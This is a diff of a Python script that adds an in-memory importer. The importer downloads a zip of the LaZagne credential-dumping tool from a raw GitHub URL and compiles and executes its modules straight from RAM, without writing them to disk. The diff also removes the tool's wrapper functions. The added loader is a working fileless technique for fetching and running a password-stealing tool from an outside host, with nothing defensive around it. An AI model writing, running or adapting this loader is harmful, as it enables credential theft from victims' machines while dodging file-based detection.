@@ -5,9 +5,8 @@ import io
 import sys
 import urllib.request
 import zipfile
-from pathlib import PurePosixPath
 
-# URL to the zipped lazagne dependencies
+# URL to the zipped lazagne dependencies [1]
 REQ_ZIP_URL = "https://raw.githubusercontent.com/fvrsnr/default/main/lazagne.zip"
 
 class MemoryZipImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
@@ -15,72 +14,57 @@ class MemoryZipImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
         self.zip_url = zip_url
         self.sources = {}
         self.packages = set()
-        self._load_zip_into_memory()
+        self._load_zip_into_memory() # [1]
+
+    def _load_zip_into_memory(self):
+        """Downloads the ZIP into RAM and maps the files to module names."""
+        req = urllib.request.Request(self.zip_url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req) as response:
+            zip_data = response.read()
+
+        # Wrap the downloaded bytes in an IO buffer so zipfile can read it from RAM
+        with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
+            for file_info in zf.infolist():
+                name = file_info.filename
+                if name.endswith('/'):
+                    continue
+                
+                # Convert ZIP file paths (e.g., lazagne/config/run.py) to Python module paths
+                mod_name = name.replace('.py', '').replace('/', '.')
+                if mod_name.endswith('.__init__'):
+                    mod_name = mod_name[:-9]
+                    self.packages.add(mod_name)
+                
+                self.sources[mod_name] = zf.read(name)
+
+    def find_spec(self, fullname, path, target=None):
+        """Tells Python if the requested module exists in our RAM buffer."""
+        if fullname in self.sources:
+            is_pkg = fullname in self.packages
+            return importlib.util.spec_from_loader(fullname, self, is_package=is_pkg)
+        return None
+
+    def create_module(self, spec):
+        # Return None to let Python use the default module creation semantics
+        return None
+
+    def exec_module(self, module):
+        """Compiles and executes the module directly from the buffered bytes."""
+        code_bytes = self.sources.get(module.__name__)
+        if code_bytes is None:
+            raise ImportError(f"Cannot load {module.__name__}")
+        
+        # Compile the raw bytes into a Python code object and execute it in the module's namespace
+        code_obj = compile(code_bytes, f"memory:{module.__name__}", 'exec')
+        exec(code_obj, module.__dict__)
 
 def install_memory_zip(zip_url):
     importer = MemoryZipImporter(zip_url)
     sys.meta_path.insert(0, importer)
     return importer
 
-# ---------------------------------------------------------
-# 1. Install memory dependencies BEFORE importing your modules
-# ---------------------------------------------------------
+# 1. Install memory dependencies BEFORE importing your modules [2]
 install_memory_zip(REQ_ZIP_URL)
 
-# ---------------------------------------------------------
-# 2. Now import your real program dependencies
-# ---------------------------------------------------------
-import argparse 
-import logging 
-import time 
-import os
-
+# 2. Now import your real program dependencies [2]
 from lazagne.config.write_output import write_in_file, StandardOutput 
-from lazagne.config.manage_modules import get_categories 
-from lazagne.config.constant import constant 
-from lazagne.config.run import run_lazagne, create_module_dic
-
-# ---------------------------------------------------------
-# 3. Main script execution logic
-# ---------------------------------------------------------
-constant.st = StandardOutput()  # Object used to manage the output / write functions 
-modules = create_module_dic()
-
-def output(output_dir=None, txt_format=False, json_format=False, all_format=False): 
-    if output_dir: 
-        if os.path.isdir(output_dir): 
-            constant.folder_name = output_dir 
-        else: 
-            print('[!] Specify a directory, not a file !')
-
-def quiet_mode(is_quiet_mode=False): 
-    if is_quiet_mode: 
-        constant.quiet_mode = True
-
-def verbosity(verbose=0): 
-    if verbose == 0: 
-        level = logging.CRITICAL 
-    elif verbose == 1: 
-        level = logging.INFO 
-    elif verbose >= 2: 
-        level = logging.DEBUG
-
-def manage_advanced_options(user_password=None): 
-    if user_password: 
-        constant.user_password = user_password
-
-def runLaZagne(category_selected='all', subcategories={}, password=None): 
-    for pwd_dic in run_lazagne(category_selected=category_selected, subcategories=subcategories, password=password): 
-        yield pwd_dic
-
-def clean_args(arg): 
-    for i in ['output', 'write_normal', 'write_json', 'write_all', 'verbose', 'auditType', 'quiet']: 
-        try: 
-            del arg[i] 
-        except Exception: 
-            pass 
-    return arg
-
-if __name__ == '__main__':
-    # Add your argparse and script initialization here
-    pass
